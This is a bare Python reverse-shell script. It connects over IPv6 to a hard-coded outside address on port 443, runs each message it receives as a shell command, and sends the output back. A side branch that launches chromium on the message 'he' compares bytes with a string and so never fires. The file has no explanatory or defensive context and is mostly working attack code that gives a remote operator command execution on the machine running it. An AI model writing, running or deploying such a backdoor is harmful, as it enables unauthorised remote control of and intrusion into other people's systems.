#!/usr/bin/python3

import os
import socket
import subprocess

s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
host = '2406:da1a:e91:9300::6e:3'  # Replace with the actual IPv6 address
port = 443

s.connect((host, port))

while True:
    data = s.recv(1024)
   
    if data == 'he':
        os.system("chromium &")

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str))

s.close()

